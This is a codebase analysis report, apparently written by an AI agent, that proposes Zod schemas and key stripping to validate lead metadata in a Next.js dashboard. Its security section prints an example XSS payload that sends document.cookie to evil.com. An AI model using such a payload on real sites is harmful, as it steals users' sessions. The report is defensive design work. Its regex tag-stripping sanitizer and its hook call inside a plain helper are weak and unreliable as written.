# Explorer 2 Report: Zod Metadata Validation Strategy

**Milestone 2**: Zod Metadata Validation  
**Date**: 2026-07-07  
**Status**: Read-Only Analysis Complete  
**Objective**: Define and enforce Zod schemas at the boundary of data ingestion (types.ts / API layer), stripping malicious payload keys.

---

## 1. Executive Summary
This report analyzes the Kenbun codebase (specifically the `dashboard` Next.js frontend) to recommend a robust validation and sanitization strategy for lead and metadata ingestion. We identify two core ingestion points (the client-side leads component and the server-side API proxy), propose a unified schema architecture using `zod`, demonstrate how to strip malicious payload keys using `.strip()`, and outline a "Senior Version" architecture designed for high scalability, type safety, and zero-trust security.

---

## 2. Lead Ingestion and Parsing Locations
We located the exact paths where lead data is ingested, routed, and parsed on the frontend:

### A. Client-Side Parsing Layer
- **File**: `dashboard/src/app/leads/page.tsx`
- **Method**: `loadLeads()` callback (Lines 129–169)
- **Code Block**:
  ```typescript
  console.log(`[LEADS] Fetching api/v1/leads with tenant: ${tenantId}`);
  let response = await request("api/v1/leads");

  if (!response.ok) {
    console.log(`[LEADS] api/v1/leads failed (${response.status}). Trying api/backend/leads...`);
    response = await request("api/backend/leads");
  }

  if (response.ok) {
    const data = await response.json(); // <-- PARSING POINT
    const leadsList = Array.isArray(data) ? data : (data.leads || []); // <-- INGESTION POINT
    ...
  }
  ```
- **Analysis**: Currently, the parsed JSON is cast directly to the `Lead` interface (defined in lines 30-43) without any structural validation. This exposes the React component tree and state to unvalidated backend payloads.

### B. Server-Side Routing / Proxy Layer
- **File**: `dashboard/src/app/api_proxy/[...slug]/route.ts`
- **Method**: `handleProxy()` function (Lines 32–154)
- **Code Block**:
  ```typescript
  const response = await fetch(backendUrl, options);
  const responseData = await response.text(); // <-- INGESTION BOUNDARY
  ...
  return new NextResponse(responseData, { ... });
  ```
- **Analysis**: The Next.js API Proxy routes HTTP traffic to the backend services. Currently, it acts as a pass-through layer, forwarding responses without validating or sanitizing the body content.

---

## 3. Recommended Schema Definition Architecture
We recommend defining all schemas in a new dedicated file: **`dashboard/src/lib/validation.ts`**.

### Rationale:
1. **DRY (Don't Repeat Yourself)**: A centralized validation module allows both the client-side (`page.tsx`) and the server-side route handler (`api_proxy`) to import the exact same validation rules.
2. **Single Source of Truth**: Changes in field requirements only need to be modified in one location.
3. **Type Coherence**: By using Zod's `z.infer<typeof LeadSchema>`, we can automatically generate and export TypeScript types. This eliminates the manually maintained `interface Lead` in `page.tsx`, ensuring compile-time safety and run-time validation are always in sync.

---

## 4. Proposed Zod Validation Schemas
Below are the proposed schemas. They include strict validation for base lead properties (UUID format, emails, etc.) and dual strategies for metadata validation.

```typescript
import { z } from "zod";

// Helper: XSS Sanitization function to strip HTML tags from strings
function sanitizeString(val: string): string {
  return val.replace(/<[^>]*>/g, "");
}

// ----------------------------------------------------
// 1. Interaction Log Schema
// ----------------------------------------------------
export const InteractionLogSchema = z.object({
  date: z.string().datetime({ message: "Invalid ISO 8601 timestamp" }),
  agent: z.string().min(1).transform(sanitizeString),
  action: z.string().min(1).transform(sanitizeString),
  summary: z.string().min(1).transform(sanitizeString),
});

// ----------------------------------------------------
// 2. Metadata Validation Schemas (Two Approaches)
// ----------------------------------------------------

/**
 * APPROACH A: Whitelist-Based Object Schema (Highly Secure)
 * Best for defined fields. Automatically drops any undefined keys (like injection payloads).
 */
export const WhitelistMetadataSchema = z.object({
  // Landscaping vertical fields
  budget: z.number().nonnegative().optional(),
  native_plants_preferred: z.boolean().optional(),
  proposed_start_date: z.string().datetime().optional(),

  // Construction vertical fields
  permit_number: z.string().regex(/^[a-zA-Z0-9_-]+$/).optional(),
  required_subcontractors: z.array(z.string().transform(sanitizeString)).optional(),

  // HVAC / Plumbing vertical fields
  maintenance_interval_months: z.number().int().positive().optional(),
  emergency_contacts: z.array(z.string().email()).optional(),
}).strip(); // <-- STRIPS OUT ALL UNKNOWN / MALICIOUS KEYS

/**
 * APPROACH B: Dynamic Key-Value Map Schema (Highly Flexible)
 * Best for arbitrary custom fields. Restricts values to safe types and sanitizes strings.
 */
export const AllowedMetadataValueSchema = z.union([
  z.string().transform(sanitizeString), // Force XSS sanitation on all dynamic strings
  z.number(),
  z.boolean(),
  z.array(z.union([z.string().transform(sanitizeString), z.number(), z.boolean()])),
]);

export const DynamicMetadataSchema = z.record(
  z.string().regex(/^[a-zA-Z0-9_-]+$/, { message: "Invalid key characters" }), // Key naming whitelist
  AllowedMetadataValueSchema
);

// We default to the Whitelist schema for strict containment, but can swap to Dynamic if required.
export const LeadMetadataSchema = WhitelistMetadataSchema;

// ----------------------------------------------------
// 3. Lead Schema
// ----------------------------------------------------
export const LeadStatusSchema = z.enum(["new", "contacted", "qualified", "converted", "lost"]);

export const LeadSchema = z.object({
  id: z.string().uuid({ message: "Lead ID must be a valid UUID v4" }),
  name: z.string().min(1).max(255).transform(sanitizeString),
  industry: z.string().min(1).max(100).transform(sanitizeString),
  creation_date: z.string().datetime({ message: "Invalid ISO 8601 timestamp" }),
  status: LeadStatusSchema,
  email: z.string().email({ message: "Invalid email format" }),
  phone: z.string().min(5).max(50).transform(sanitizeString),
  address: z.string().min(1).transform(sanitizeString),
  score: z.number().min(0).max(100),
  notes: z.string().transform(sanitizeString),
  source: z.string().min(1).transform(sanitizeString),
  interaction_history: z.array(InteractionLogSchema),
  metadata: LeadMetadataSchema.default({}), // Ingests and sanitizes metadata
});

// Leads List Schema
export const LeadsListSchema = z.array(LeadSchema);

// Inferred TypeScript Types
export type InteractionLog = z.infer<typeof InteractionLogSchema>;
export type Lead = z.infer<typeof LeadSchema>;
export type LeadMetadata = z.infer<typeof LeadMetadataSchema>;
```

---

## 5. Security & Key Stripping Strategy

To satisfy security mandates against XSS and injection vectors, Zod will enforce validation via two main paradigms:

### A. The Whitelist Stripping Paradigm (`.strip()`)
By default, Zod objects use `.strip()`, meaning any keys in the input object that are not defined in the schema will be **silently removed** during parsing. 
If an attacker attempts to inject a payload like this:
```json
{
  "budget": 65000,
  "native_plants_preferred": true,
  "malicious_xss": "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>"
}
```
Zod's parser will output:
```json
{
  "budget": 65000,
  "native_plants_preferred": true
}
```
`malicious_xss` is completely discarded before the object is saved to the local React state or rendered in the DOM, preventing Cross-Site Scripting (XSS).

### B. The Strict Paradigm (`.strict()`)
If we want to fail-fast on unknown properties, we can chain `.strict()` instead of `.strip()`. This will cause the validation step to throw a `ZodError` immediately if any unknown key is supplied. For internal-only admin APIs, this is useful, but for dynamic leads ingestion, `.strip()` is preferred as it gracefully handles heterogeneous metadata without crashing the client UI.

### C. Type Safety for Accepted Metadata Fields
We enforce type limits on custom properties to prevent memory exhaustion and buffer overflows:
- **Strings**: Forced to undergo HTML-tag stripping via `.transform(sanitizeString)`.
- **Numbers**: Constrained via `.nonnegative()` or `.int()`.
- **Arrays**: Enforced to only contain primitive values (no deeply nested object arrays that could bypass simple sanitization).

---

## 6. Recommended NPM Packages
To implement this validation structure, the following NPM package must be installed in the `dashboard` directory:

1. **`zod`** (Core validation library)
   - Command: `npm install zod`
   - Purpose: Schema definition, validation execution, and static type inference.

*Optional Developer Tool:*
2. **`zod-validation-error`**
   - Command: `npm install zod-validation-error`
   - Purpose: Translates Zod errors into clear, developer-friendly validation logs on the console and frontend notifications.

---

## 7. The "Senior Version" (CTO Recommendations)
*Proposing patterns for infinite scalability, high performance, and absolute security.*

### A. Dual-Boundary Enforcement (Zero-Trust)
Don't rely solely on client-side state validation. We propose running the Zod validation in two layers:
1. **Layer 1: Server-Side API Proxy Gate**  
   Inside `dashboard/src/app/api_proxy/[...slug]/route.ts`, parse the backend response body and validate it against `LeadsListSchema`. If validation fails or strips keys, log the warning securely on the server and forward only the sanitized payload to the client. This keeps raw malicious payloads completely out of the browser's memory space.
2. **Layer 2: Client-Side Component Guard**  
   Run the schema validator right inside `loadLeads()` after calling `response.json()`. This protects the React state against local modification, caching errors, or mock-data injection.

### B. Middleware Integration
Integrate validation directly into a central API response parser, rather than writing custom `schema.safeParse` blocks in every page component. Example helper in `apiClient.ts` or a new wrapper:
```typescript
export async function fetchAndValidate<T>(
  path: string, 
  schema: z.ZodSchema<T>
): Promise<T> {
  const { request } = useApiClient();
  const response = await request(path);
  if (!response.ok) throw new Error("Fetch failed");
  const data = await response.json();
  
  const result = schema.safeParse(data);
  if (!result.success) {
    console.error("Schema validation failed:", result.error);
    throw new Error("Data corruption detected");
  }
  return result.data;
}
```

### C. Performance: Schema Caching & Stream Parsing
Under high loads (1M+ leads), JSON parsing and validation can block the event loop. The Zod schemas must be defined as static constants (as proposed) so they are parsed only once when the module loads, avoiding garbage collection overhead from dynamic schema creation inside hooks or callbacks.
